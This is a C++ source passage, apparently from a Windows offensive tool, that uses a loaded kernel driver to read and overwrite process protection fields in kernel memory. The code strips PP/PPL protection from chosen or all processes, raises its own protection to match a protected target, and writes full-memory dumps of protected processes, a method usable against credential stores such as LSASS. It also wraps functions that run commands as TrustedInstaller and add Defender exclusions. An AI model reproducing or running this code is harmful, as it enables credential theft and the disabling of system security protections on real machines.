        auto secSigLevelOffset = m_of->GetOffset(Offset::ProcessSectionSignatureLevel);
        
        // Check interruption before signature level reads
        if (g_interrupted) {
            DEBUG(L"Process enumeration cancelled during signature read (processed %d entries)", processCount);
            break;
        }
        
        if (sigLevelOffset)
            signatureLevel = m_rtc->Read8(current + sigLevelOffset.value());
        if (secSigLevelOffset)
            sectionSignatureLevel = m_rtc->Read8(current + secSigLevelOffset.value());
        
        if (pidPtr && protection) {
            ULONG_PTR pidValue = pidPtr.value();
            
            if (pidValue > 0 && pidValue <= MAXDWORD) {
                ProcessEntry entry{};
                entry.KernelAddress = current;
                entry.Pid = static_cast<DWORD>(pidValue);
                entry.ProtectionLevel = Utils::GetProtectionLevel(protection.value());
                entry.SignerType = Utils::GetSignerType(protection.value());
                entry.SignatureLevel = signatureLevel.value_or(0);
                entry.SectionSignatureLevel = sectionSignatureLevel.value_or(0);
                
                // Check interruption before expensive process name resolution
                if (g_interrupted) {
                    DEBUG(L"Process enumeration cancelled during name resolution (processed %d entries)", processCount);
                    break;
                }
                
                std::wstring basicName = Utils::GetProcessName(entry.Pid);
                
                if (basicName == L"[Unknown]") {
                    entry.ProcessName = ResolveUnknownProcessLocal(
                        entry.Pid, 
                        entry.KernelAddress, 
                        entry.ProtectionLevel, 
                        entry.SignerType
                    );
                } else {
                    entry.ProcessName = basicName;
                }
                
                processes.push_back(entry);
                processCount++; // Increment counter for safety check only
            }
        }

        // Final interruption check before advancing to next process
        if (g_interrupted) {
            DEBUG(L"Process enumeration cancelled before advancing to next process (found %d total)", processCount);
            break;
        }

        auto nextPtr = m_rtc->ReadPtr(current + linksOffset.value());
        if (!nextPtr) break;
        
        current = nextPtr.value() - linksOffset.value();
        
        // Safety check: prevent infinite loops and respect interruption
        if (processCount >= 10000) {
            DEBUG(L"Process enumeration stopped at safety limit (10,000 processes)");
            break;
        }
        
    } while (current != initialProcess.value() && !g_interrupted);

    // Final status message - only for debug builds or when interrupted
    if (g_interrupted) {
        DEBUG(L"Process enumeration interrupted by user - returning %d partial results", processCount);
    }

    return processes;
}

std::optional<UCHAR> Controller::GetProcessProtection(ULONG_PTR addr) noexcept {
    auto offset = m_of->GetOffset(Offset::ProcessProtection);
    if (!offset) return std::nullopt;
    
    return m_rtc->Read8(addr + offset.value());
}

bool Controller::SetProcessProtection(ULONG_PTR addr, UCHAR protection) noexcept {
    auto offset = m_of->GetOffset(Offset::ProcessProtection);
    if (!offset) return false;

    return m_rtc->Write8(addr + offset.value(), protection);
}

// ======================= Process Name Resolution with Driver =======================

std::optional<ProcessMatch> Controller::ResolveProcessName(const std::wstring& processName) noexcept {
    // Always use atomic operation - load, execute, cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return std::nullopt;
    }
    
    auto matches = FindProcessesByName(processName);
    
    if (matches.empty()) {
        ERROR(L"No process found matching pattern: %s", processName.c_str());
        PerformAtomicCleanup();
        return std::nullopt;
    }
    
    if (matches.size() == 1) {
        INFO(L"Found process: %s (PID %d)", matches[0].ProcessName.c_str(), matches[0].Pid);
        PerformAtomicCleanup(); // Always cleanup after operation
        return matches[0];
    }
    
    ERROR(L"Multiple processes found matching pattern '%s'. Please use a more specific name:", processName.c_str());
    for (const auto& match : matches) {
        std::wcout << L"  PID " << match.Pid << L": " << match.ProcessName << L"\n";
    }
    
    PerformAtomicCleanup(); // Always cleanup
    return std::nullopt;
}

std::vector<ProcessMatch> Controller::FindProcessesByName(const std::wstring& pattern) noexcept {
    std::vector<ProcessMatch> matches;
    auto processes = GetProcessList();
    
    for (const auto& entry : processes) {
        if (IsPatternMatch(entry.ProcessName, pattern)) {
            ProcessMatch match;
            match.Pid = entry.Pid;
            match.ProcessName = entry.ProcessName;
            match.KernelAddress = entry.KernelAddress;
            matches.push_back(match);
        }
    }
    
    return matches;
}

bool Controller::IsPatternMatch(const std::wstring& processName, const std::wstring& pattern) noexcept {
    std::wstring lowerProcessName = processName;
    std::wstring lowerPattern = pattern;
    
    std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::towlower);
    std::transform(lowerPattern.begin(), lowerPattern.end(), lowerPattern.begin(), ::towlower);
    
    // Exact match check
    if (lowerProcessName == lowerPattern) return true;
    
    // Partial match check
    if (lowerProcessName.find(lowerPattern) != std::wstring::npos) return true;
    
    // Wildcard pattern matching with regex
    std::wstring regexPattern = lowerPattern;
    const std::wstring specialChars = L"\\^$.+{}[]|()";
    for (auto& ch : regexPattern) {
        if (specialChars.find(ch) != std::wstring::npos) {
            regexPattern = std::regex_replace(regexPattern, std::wregex(std::wstring(1, ch)), L"\\" + std::wstring(1, ch));
        }
    }
    
    regexPattern = std::regex_replace(regexPattern, std::wregex(L"\\*"), L".*");
    
    try {
        std::wregex regex(regexPattern, std::regex_constants::icase);
        return std::regex_search(lowerProcessName, regex);
    } catch (const std::regex_error&) {
        return false;
    }
}

// ======================= Memory Dumping Operations (Atomic) =======================

bool Controller::DumpProcess(DWORD pid, const std::wstring& outputPath) noexcept {
    return CreateMiniDump(pid, outputPath);
}

bool Controller::DumpProcessByName(const std::wstring& processName, const std::wstring& outputPath) noexcept {
    // Atomic operation for name resolution
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto matches = FindProcessesByName(processName);
    
    if (matches.empty()) {
        ERROR(L"No process found matching pattern: %s", processName.c_str());
        PerformAtomicCleanup();
        return false;
    }
    
    if (matches.size() > 1) {
        ERROR(L"Multiple processes found matching pattern '%s'. Please use a more specific name:", processName.c_str());
        for (const auto& match : matches) {
            std::wcout << L"  PID " << match.Pid << L": " << match.ProcessName << L"\n";
        }
        PerformAtomicCleanup();
        return false;
    }
    
    auto match = matches[0];
    INFO(L"Found process: %s (PID %d)", match.ProcessName.c_str(), match.Pid);
    
    // Clean up driver before CreateMiniDump (which will load it atomically)
    PerformAtomicCleanup();
    
    return CreateMiniDump(match.Pid, outputPath);
}

// ======================= Self-Protection Operations =======================

bool Controller::SelfProtect(const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    auto level = Utils::GetProtectionLevelFromString(protectionLevel);
    auto signer = Utils::GetSignerTypeFromString(signerType);

    if (!level || !signer) {
        ERROR(L"Invalid protection level or signer type specified");
        return false;
    }

    UCHAR newProtection = Utils::GetProtection(level.value(), signer.value());
    return SetCurrentProcessProtection(newProtection);
}

bool Controller::SetCurrentProcessProtection(UCHAR protection) noexcept {
    DWORD currentPid = GetCurrentProcessId();
    auto kernelAddr = GetProcessKernelAddress(currentPid);
    if (!kernelAddr) {
        ERROR(L"Failed to get kernel address for current process");
        return false;
    }
    return SetProcessProtection(kernelAddr.value(), protection);
}

bool Controller::EnableDebugPrivilege() noexcept {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bool result = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
    CloseHandle(hToken);
    return result;
}

// ======================= System Integration & TrustedInstaller =======================

bool Controller::RunAsTrustedInstaller(const std::wstring& commandLine) {
    return m_trustedInstaller.RunAsTrustedInstaller(commandLine);
}

bool Controller::RunAsTrustedInstallerSilent(const std::wstring& command) {
    return m_trustedInstaller.RunAsTrustedInstallerSilent(command);
}

bool Controller::AddToDefenderExclusions() {
    return m_trustedInstaller.AddToDefenderExclusions();
}

bool Controller::AddContextMenuEntries() {
    return m_trustedInstaller.AddContextMenuEntries();
}

// ======================= Process Information Operations (Atomic) =======================

bool Controller::GetProcessProtection(DWORD pid) noexcept {
    // Check if driver is already loaded (from previous operation)
    bool driverWasLoaded = IsDriverCurrentlyLoaded();
    bool needsCleanup = false;
    
    if (!driverWasLoaded) {
        if (!PerformAtomicInitWithErrorCleanup()) {
            return false;
        }
        needsCleanup = true; // Mark that we loaded the driver
    }
    
    // Perform actual operations instead of diagnostic test
    auto kernelAddr = GetProcessKernelAddress(pid);
    if (!kernelAddr) {
        ERROR(L"Failed to get kernel address for PID %d", pid);
        if (needsCleanup) PerformAtomicCleanup();
        return false;
    }
    
    auto currentProtection = GetProcessProtection(kernelAddr.value());
    if (!currentProtection) {
        ERROR(L"Failed to read protection for PID %d", pid);
        if (needsCleanup) PerformAtomicCleanup();
        return false;
    }
    
    // Display protection information
    UCHAR protLevel = Utils::GetProtectionLevel(currentProtection.value());
    UCHAR signerType = Utils::GetSignerType(currentProtection.value());
    
    if (currentProtection.value() == 0) {
        INFO(L"PID %d (%s) is not protected", pid, Utils::GetProcessName(pid).c_str());
    } else {
        INFO(L"PID %d (%s) protection: %s-%s (raw: 0x%02x)", 
             pid, 
             Utils::GetProcessName(pid).c_str(),
             Utils::GetProtectionLevelAsString(protLevel),
             Utils::GetSignerTypeAsString(signerType),
             currentProtection.value());
    }
    
    // Cleanup only if we loaded the driver
    if (needsCleanup) {
        PerformAtomicCleanup();
    }
    
    return true;
}

bool Controller::GetProcessProtectionByName(const std::wstring& processName) noexcept {
    // Use driver-free resolution, then atomic operation
    auto match = ResolveNameWithoutDriver(processName);
    if (!match) {
        return false;
    }
    
    return GetProcessProtection(match->Pid);
}

// Note: Additional process protection operations, memory dumping implementation,
// and batch processing functions would continue here following the same atomic pattern
// and obfuscation approach established above.
// ======================= Process Information Display (Atomic) =======================

bool Controller::ListProtectedProcesses() noexcept {
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto processes = GetProcessList();
    DWORD count = 0;

    // Enable console color support for enhanced output
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD consoleMode = 0;
    GetConsoleMode(hConsole, &consoleMode);
    SetConsoleMode(hConsole, consoleMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);

    // Color codes for different protection levels and states
    const wchar_t* GREEN = L"\033[92m";    // System processes
    const wchar_t* YELLOW = L"\033[93m";   // User processes with protection
    const wchar_t* BLUE = L"\033[94m";     // Processes with unchecked signatures
    const wchar_t* HEADER = L"\033[97;44m"; // Table header
    const wchar_t* RESET = L"\033[0m";     // Reset color

    // Display formatted table header
    std::wcout << GREEN;
    std::wcout << L"\n -------+------------------------------+---------+-----------------+-----------------------+-----------------------+--------------------\n";
    std::wcout << HEADER;
    std::wcout << L"   PID  |         Process Name         |  Level  |     Signer      |     EXE sig. level    |     DLL sig. level    |    Kernel addr.    ";
    std::wcout << RESET << L"\n";
    std::wcout << GREEN;
    std::wcout << L" -------+------------------------------+---------+-----------------+-----------------------+-----------------------+--------------------\n";

    // Display protected processes with color coding
    for (const auto& entry : processes) {
        if (entry.ProtectionLevel > 0) {
            const wchar_t* processColor = GREEN;
            
            // Determine color based on signature verification status
            bool hasUncheckedSignatures = (entry.SignatureLevel == 0x00 || entry.SectionSignatureLevel == 0x00);

            if (hasUncheckedSignatures) {
                processColor = BLUE; // Processes with bypass potential
            } else {
                // Check if it's a user process vs system process
                bool isUserProcess = (entry.SignerType != static_cast<UCHAR>(PS_PROTECTED_SIGNER::Windows) &&
                                      entry.SignerType != static_cast<UCHAR>(PS_PROTECTED_SIGNER::WinTcb) &&
                                      entry.SignerType != static_cast<UCHAR>(PS_PROTECTED_SIGNER::WinSystem) &&
                                      entry.SignerType != static_cast<UCHAR>(PS_PROTECTED_SIGNER::Lsa));
                processColor = isUserProcess ? YELLOW : GREEN;
            }

            std::wcout << processColor;
            wchar_t buffer[512];
            swprintf_s(buffer, L" %6d | %-28s | %-3s (%d) | %-11s (%d) | %-14s (0x%02x) | %-14s (0x%02x) | 0x%016llx\n",
                       entry.Pid,
                       entry.ProcessName.c_str(),
                       Utils::GetProtectionLevelAsString(entry.ProtectionLevel),
                       entry.ProtectionLevel,
                       Utils::GetSignerTypeAsString(entry.SignerType),
                       entry.SignerType,
                       Utils::GetSignatureLevelAsString(entry.SignatureLevel),
                       entry.SignatureLevel,
                       Utils::GetSignatureLevelAsString(entry.SectionSignatureLevel),
                       entry.SectionSignatureLevel,
                       entry.KernelAddress);
            std::wcout << buffer;
            count++;
        }
    }

    std::wcout << GREEN;
    std::wcout << L" -------+------------------------------+---------+-----------------+-----------------------+-----------------------+--------------------\n";
    std::wcout << RESET << L"\n";

    SUCCESS(L"Enumerated %d protected processes", count);
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return true;
}

// ======================= Memory Dump Creation (Atomic) =======================

bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexcept {
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInit()) {
        return false;
    }
    
    // Early interruption check before resource allocation
    extern volatile bool g_interrupted;
    if (g_interrupted) {
        INFO(L"Operation cancelled by user before start");
        PerformAtomicCleanup();
        return false;
    }
    
    std::wstring processName = Utils::GetProcessName(pid);

    // Check for system processes that cannot be dumped
    if (pid == 4 || processName == L"System") {
        ERROR(L"Cannot dump System process (PID %d) - Windows kernel process, undumpable by design", pid);
        PerformAtomicCleanup();
        return false;
    }

    if (pid == 188 || processName == L"Secure System") {
        ERROR(L"Cannot dump Secure System process (PID %d) - VSM/VBS protected process, undumpable", pid);
        PerformAtomicCleanup();
        return false;
    }

    if (pid == 232 || processName == L"Registry") {
        ERROR(L"Cannot dump Registry process (PID %d) - kernel registry subsystem, undumpable", pid);
        PerformAtomicCleanup();
        return false;
    }

    if (processName == L"Memory Compression" || pid == 3052) {
        ERROR(L"Cannot dump Memory Compression process (PID %d) - kernel memory manager, undumpable", pid);
        PerformAtomicCleanup();
        return false;
    }

    // Warn about low PID processes
    if (pid < 100 && pid != 0) {
        INFO(L"Warning: Attempting to dump low PID process (%d: %s) - may fail due to system-level protection", 
             pid, processName.c_str());
    }

    // Check interruption after validation
    if (g_interrupted) {
        INFO(L"Operation cancelled by user during validation");
        PerformAtomicCleanup();
        return false;
    }

    // Get kernel address and protection information
    auto kernelAddr = GetProcessKernelAddress(pid);
    if (!kernelAddr) {
        ERROR(L"Failed to get kernel address for target process");
        PerformAtomicCleanup();
        return false;
    }

    auto targetProtection = GetProcessProtection(kernelAddr.value());
    if (!targetProtection) {
        ERROR(L"Failed to get protection info for target process");
        PerformAtomicCleanup();
        return false;
    }

    // Check interruption before protection elevation
    if (g_interrupted) {
        INFO(L"Operation cancelled by user before protection setup");
        PerformAtomicCleanup();
        return false;
    }

    // Elevate self-protection to match target if needed
    if (targetProtection.value() > 0) {
        UCHAR targetLevel = Utils::GetProtectionLevel(targetProtection.value());
        UCHAR targetSigner = Utils::GetSignerType(targetProtection.value());

        std::wstring levelStr = (targetLevel == static_cast<UCHAR>(PS_PROTECTED_TYPE::Protected)) ? L"PP" : L"PPL";
        std::wstring signerStr;

        switch (static_cast<PS_PROTECTED_SIGNER>(targetSigner)) {
            case PS_PROTECTED_SIGNER::Lsa: signerStr = L"Lsa"; break;
            case PS_PROTECTED_SIGNER::WinTcb: signerStr = L"WinTcb"; break;
            case PS_PROTECTED_SIGNER::WinSystem: signerStr = L"WinSystem"; break;
            case PS_PROTECTED_SIGNER::Windows: signerStr = L"Windows"; break;
            case PS_PROTECTED_SIGNER::Antimalware: signerStr = L"Antimalware"; break;
            case PS_PROTECTED_SIGNER::Authenticode: signerStr = L"Authenticode"; break;
            case PS_PROTECTED_SIGNER::CodeGen: signerStr = L"CodeGen"; break;
            case PS_PROTECTED_SIGNER::App: signerStr = L"App"; break;
            default: 
                ERROR(L"Unknown signer type for target process");
                PerformAtomicCleanup();
                return false;
        }

        INFO(L"Target process protection: %s-%s", levelStr.c_str(), signerStr.c_str());

        if (!SelfProtect(levelStr, signerStr)) {
            ERROR(L"Failed to set self protection to %s-%s", levelStr.c_str(), signerStr.c_str());
        } else {
            SUCCESS(L"Set self protection to %s-%s", levelStr.c_str(), signerStr.c_str());
        }
    } else {
        INFO(L"Target process is not protected, no self-protection needed");
    }

    if (!EnableDebugPrivilege()) {
        ERROR(L"Failed to enable debug privilege");
    }

    // Check interruption before opening target process
    if (g_interrupted) {
        INFO(L"Operation cancelled by user before process access");
        SelfProtect(L"none", L"none"); // Remove self-protection before cleanup
        PerformAtomicCleanup();
        return false;
    }

    // Open target process for memory access
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!hProcess) {
            ERROR(L"Failed to open process (error: %d)", GetLastError());
            PerformAtomicCleanup();
            return false;
        }
    }

    // Construct output file path
    std::wstring fullPath = outputPath;
    if (!outputPath.empty() && outputPath.back() != L'\\')
        fullPath += L'\\';
    fullPath += processName + L"_" + std::to_wstring(pid) + L".dmp";

    // Create dump file
    HANDLE hFile = CreateFileW(fullPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        ERROR(L"Failed to create dump file (error: %d)", GetLastError());
        CloseHandle(hProcess);
        PerformAtomicCleanup();
        return false;
    }

    // Configure comprehensive dump type
    MINIDUMP_TYPE dumpType = static_cast<MINIDUMP_TYPE>(
        MiniDumpWithFullMemory |
        MiniDumpWithHandleData |
        MiniDumpWithUnloadedModules |
        MiniDumpWithFullMemoryInfo |
        MiniDumpWithThreadInfo |
        MiniDumpWithTokenInformation
    );

    // Critical interruption check before long-running operation
    if (g_interrupted) {
        INFO(L"Operation cancelled by user before dump creation");
        CloseHandle(hFile);
        CloseHandle(hProcess);
        DeleteFileW(fullPath.c_str()); // Remove incomplete file
        SelfProtect(L"none", L"none"); // Remove self-protection
        PerformAtomicCleanup();
        return false;
    }

    INFO(L"Creating memory dump - this may take a while. Press Ctrl+C to cancel safely.");
    
    // Execute memory dump creation (can take minutes for large processes)
    BOOL result = MiniDumpWriteDump(hProcess, pid, hFile, dumpType, NULL, NULL, NULL);
    
    // Post-dump interruption check
    if (g_interrupted) {
        INFO(L"Operation was cancelled during dump creation");
        CloseHandle(hFile);
        CloseHandle(hProcess);
        DeleteFileW(fullPath.c_str()); // Remove potentially corrupt file
        SelfProtect(L"none", L"none");
        PerformAtomicCleanup();
        return false;
    }
    
    CloseHandle(hFile);
    CloseHandle(hProcess);

    // Handle dump creation errors
    if (!result) {
        DWORD error = GetLastError();
        switch (error) {
            case ERROR_TIMEOUT:
                ERROR(L"MiniDumpWriteDump timed out - process may be unresponsive or in critical section");
                break;
            case RPC_S_CALL_FAILED:
                ERROR(L"RPC call failed - process may be a kernel-mode or system-critical process");
                break;
            case ERROR_ACCESS_DENIED:
                ERROR(L"Access denied - insufficient privileges even with protection bypass");
                break;
            case ERROR_PARTIAL_COPY:
                ERROR(L"Partial copy - some memory regions could not be read");
                break;
            default:
                ERROR(L"MiniDumpWriteDump failed (error: %d / 0x%08x)", error, error);
                break;
        }
        DeleteFileW(fullPath.c_str());
        SelfProtect(L"none", L"none");
        PerformAtomicCleanup();
        return false;
    }

    SUCCESS(L"Memory dump created successfully: %s", fullPath.c_str());
    
    // Remove self-protection before cleanup
    INFO(L"Removing self-protection before cleanup...");
    SelfProtect(L"none", L"none");
    
    // Final interruption check before cleanup
    if (g_interrupted) {
        INFO(L"Operation completed but cleanup was interrupted");
        PerformAtomicCleanup();
        return true; // Dump was successful
    }
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return true;
}

// ======================= Process Protection Operations (Atomic) =======================

bool Controller::UnprotectProcess(DWORD pid) noexcept {
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto kernelAddr = GetProcessKernelAddress(pid);
    if (!kernelAddr) {
        PerformAtomicCleanup();
        return false;
    }

    auto currentProtection = GetProcessProtection(kernelAddr.value());
    if (!currentProtection) {
        PerformAtomicCleanup();
        return false;
    }

    if (currentProtection.value() == 0) {
        ERROR(L"PID %d is not protected", pid);
        PerformAtomicCleanup();
        return false;
    }

    if (!SetProcessProtection(kernelAddr.value(), 0)) {
        ERROR(L"Failed to remove protection from PID %d", pid);
        PerformAtomicCleanup();
        return false;
    }

    SUCCESS(L"Removed protection from PID %d", pid);
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return true;
}

bool Controller::ProtectProcess(DWORD pid, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto kernelAddr = GetProcessKernelAddress(pid);
    if (!kernelAddr) {
        PerformAtomicCleanup();
        return false;
    }

    auto currentProtection = GetProcessProtection(kernelAddr.value());
    if (!currentProtection) {
        PerformAtomicCleanup();
        return false;
    }

    if (currentProtection.value() > 0) {
        ERROR(L"PID %d is already protected", pid);
        PerformAtomicCleanup();
        return false;
    }

    auto level = Utils::GetProtectionLevelFromString(protectionLevel);
    auto signer = Utils::GetSignerTypeFromString(signerType);
    
    if (!level || !signer) {
        ERROR(L"Invalid protection level or signer type");
        PerformAtomicCleanup();
        return false;
    }

    UCHAR newProtection = Utils::GetProtection(level.value(), signer.value());
    if (!SetProcessProtection(kernelAddr.value(), newProtection)) {
        ERROR(L"Failed to protect PID %d", pid);
        PerformAtomicCleanup();
        return false;
    }

    SUCCESS(L"Protected PID %d with %s-%s", pid, protectionLevel.c_str(), signerType.c_str());
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return true;
}

bool Controller::SetProcessProtection(DWORD pid, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto level = Utils::GetProtectionLevelFromString(protectionLevel);
    auto signer = Utils::GetSignerTypeFromString(signerType);
    
    if (!level || !signer) {
        ERROR(L"Invalid protection level or signer type");
        PerformAtomicCleanup();
        return false;
    }

    auto kernelAddr = GetProcessKernelAddress(pid);
    if (!kernelAddr) {
        PerformAtomicCleanup();
        return false;
    }

    UCHAR newProtection = Utils::GetProtection(level.value(), signer.value());
    
    if (!SetProcessProtection(kernelAddr.value(), newProtection)) {
        ERROR(L"Failed to set protection on PID %d", pid);
        PerformAtomicCleanup();
        return false;
    }

    SUCCESS(L"Set protection %s-%s on PID %d", protectionLevel.c_str(), signerType.c_str(), pid);
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return true;
}

// ======================= Mass Protection Operations (Atomic) =======================

bool Controller::UnprotectAllProcesses() noexcept {
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto processes = GetProcessList();
    DWORD totalCount = 0;
    DWORD successCount = 0;
    
    INFO(L"Starting mass unprotection of all protected processes...");
    
    for (const auto& entry : processes) {
        if (entry.ProtectionLevel > 0) {
            totalCount++;
            
            if (SetProcessProtection(entry.KernelAddress, 0)) {
                successCount++;
                SUCCESS(L"Removed protection from PID %d (%s)", entry.Pid, entry.ProcessName.c_str());
            } else {
                ERROR(L"Failed to remove protection from PID %d (%s)", entry.Pid, entry.ProcessName.c_str());
            }
        }
    }
    
    if (totalCount == 0) {
        INFO(L"No protected processes found");
    } else {
        INFO(L"Mass unprotection completed: %d/%d processes successfully unprotected", successCount, totalCount);
    }
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return successCount == totalCount;
}

bool Controller::UnprotectMultipleProcesses(const std::vector<std::wstring>& targets) noexcept {
    if (targets.empty()) {
        ERROR(L"No targets specified for batch unprotection");
        return false;
    }
    
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    DWORD successCount = 0;
    DWORD totalCount = static_cast<DWORD>(targets.size());
    
    INFO(L"Starting batch unprotection of %d targets...", totalCount);
    
    for (const auto& target : targets) {
        bool result = false;
        
        if (IsNumeric(target)) {
            auto pid = ParsePid(target);
            if (pid) {
                auto kernelAddr = GetProcessKernelAddress(pid.value());
                if (kernelAddr) {
                    auto currentProtection = GetProcessProtection(kernelAddr.value());
                    if (currentProtection && currentProtection.value() > 0) {
                        if (SetProcessProtection(kernelAddr.value(), 0)) {
                            SUCCESS(L"Removed protection from PID %d", pid.value());
                            result = true;
                        } else {
                            ERROR(L"Failed to remove protection from PID %d", pid.value());
                        }
                    } else {
                        INFO(L"PID %d is not protected", pid.value());
                        result = true; // Not an error if already unprotected
                    }
                }
            } else {
                ERROR(L"Invalid PID format: %s", target.c_str());
            }
        } else {
            // For process names, use the already loaded driver to find matches
            auto matches = FindProcessesByName(target);
            if (matches.size() == 1) {
                auto match = matches[0];
                auto currentProtection = GetProcessProtection(match.KernelAddress);
                if (currentProtection && currentProtection.value() > 0) {
                    if (SetProcessProtection(match.KernelAddress, 0)) {
                        SUCCESS(L"Removed protection from %s (PID %d)", match.ProcessName.c_str(), match.Pid);
                        result = true;
                    } else {
                        ERROR(L"Failed to remove protection from %s (PID %d)", match.ProcessName.c_str(), match.Pid);
                    }
                } else {
                    INFO(L"%s (PID %d) is not protected", match.ProcessName.c_str(), match.Pid);
                    result = true; // Not an error if already unprotected
                }
            } else {
                ERROR(L"Could not resolve process name: %s", target.c_str());
            }
        }
        
        if (result) successCount++;
    }
    
    INFO(L"Batch unprotection completed: %d/%d targets successfully processed", successCount, totalCount);
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return successCount == totalCount;
}

// ======================= Process Name-Based Operations (Composite Pattern) =======================

bool Controller::ProtectProcessByName(const std::wstring& processName, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    // Composite: Resolve name without driver, let ProtectProcess handle atomic operations
    auto match = ResolveNameWithoutDriver(processName);
    if (!match) {
        return false;
    }
    
    return ProtectProcess(match->Pid, protectionLevel, signerType);
}

bool Controller::UnprotectProcessByName(const std::wstring& processName) noexcept {
    // Composite: Resolve name without driver, let UnprotectProcess handle atomic operations
    auto match = ResolveNameWithoutDriver(processName);
    if (!match) {
        return false;
    }
    
    return UnprotectProcess(match->Pid);
}

bool Controller::SetProcessProtectionByName(const std::wstring& processName, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    // Composite: Resolve name without driver, let SetProcessProtection handle atomic operations
    auto match = ResolveNameWithoutDriver(processName);
    if (!match) {
        return false;
    }
    
    return SetProcessProtection(match->Pid, protectionLevel, signerType);
}
